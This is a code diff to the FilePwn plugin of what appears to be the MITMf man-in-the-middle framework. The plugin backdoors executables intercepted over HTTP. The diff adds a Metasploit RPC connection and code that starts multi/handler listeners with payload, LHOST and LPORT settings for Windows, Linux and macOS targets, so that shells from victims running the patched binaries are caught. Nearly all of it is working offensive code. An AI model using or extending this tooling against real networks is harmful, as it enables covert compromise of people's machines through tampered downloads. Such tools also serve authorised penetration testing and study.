@@ -67,6 +67,7 @@ import multiprocessing
 from libs.bdfactory import pebin
 from libs.bdfactory import elfbin
 from libs.bdfactory import machobin
+from core.msfrpc import Msfrpc
 from plugins.plugin import Plugin
 from tempfile import mkstemp
 from configobj import ConfigObj
@@ -79,7 +80,7 @@ class FilePwn(Plugin):
     desc        = "Backdoor executables being sent over http using bdfactory"
     implements  = ["handleResponse"]
     tree_output = ["BDFProxy v0.3.2 online"]
-    version     = "0.2"
+    version     = "0.3"
     has_opts    = False
 
     def initialize(self, options):
@@ -109,6 +110,20 @@ class FilePwn(Plugin):
         #NOT USED NOW
         #self.supportedBins = ('MZ', '7f454c46'.decode('hex'))
 
+        #Metasploit options
+        msfcfg  = options.configfile['MITMf']['Metasploit']
+        rpcip   = msfcfg['rpcip']
+        rpcpass = msfcfg['rpcpass']
+
+        try:
+            self.msf = Msfrpc({"host": rpcip})  #create an instance of msfrpc libarary
+            self.msf.login('msf', rpcpass)
+            version = self.msf.call('core.version')['version']
+            self.tree_output.append("Connected to Metasploit v%s" % version)
+        except Exception:
+            sys.exit("[-] Error connecting to MSF! Make sure you started Metasploit and its MSGRPC server")
+
+        #FilePwn options
         self.userConfig      = options.configfile['FilePwn']
         self.FileSizeMax     = self.userConfig['targets']['ALL']['FileSizeMax']
         self.WindowsIntelx86 = self.userConfig['targets']['ALL']['WindowsIntelx86']
@@ -122,6 +137,32 @@ class FilePwn(Plugin):
         self.FatPriority     = self.userConfig['targets']['ALL']['FatPriority']
         self.zipblacklist    = self.userConfig['ZIP']['blacklist']
         self.tarblacklist    = self.userConfig['TAR']['blacklist']
+
+        self.tree_output.append("Setting up Metasploit payload handlers")
+        
+        jobs = self.msf.call('job.list')
+        for config in [self.LinuxIntelx86, self.LinuxIntelx64, self.WindowsIntelx86, self.WindowsIntelx64, self.MachoIntelx86, self.MachoIntelx64]:
+            cmd = "use exploit/multi/handler\n"
+            cmd += "set payload {}\n".format(config["MSFPAYLOAD"])
+            cmd += "set LHOST {}\n".format(config["HOST"])
+            cmd += "set LPORT {}\n".format(config["PORT"])
+            cmd += "exploit -j\n"
+
+            if jobs:
+                for pid, name in jobs.iteritems():
+                    info = self.msf.call('job.info', [pid])
+                    if (info['name'] != "Exploit: multi/handler") or (info['datastore']['payload'] != config["MSFPAYLOAD"]) or (info['datastore']['LPORT'] != config["PORT"]) or (info['datastore']['lhost'] != config['HOST']):
+                        #Create a virtual console
+                        c_id = self.msf.call('console.create')['id']
+
+                        #write the cmd to the newly created console
+                        self.msf.call('console.write', [c_id, cmd])
+            else:
+                #Create a virtual console
+                c_id = self.msf.call('console.create')['id']
+
+                #write the cmd to the newly created console
+                self.msf.call('console.write', [c_id, cmd])
 
     def convert_to_Bool(self, aString):
         if aString.lower() == 'true':
@@ -300,7 +341,7 @@ class FilePwn(Plugin):
 
         except Exception as e:
             print 'Exception', str(e)
-            mitmf_logger.warning("EXCEPTION IN binaryGrinder %s", str(e))
+            mitmf_logger.warning("EXCEPTION IN binaryGrinder {}".format(e))
             return None
 
     def tar_files(self, aTarFileBytes, formatt):
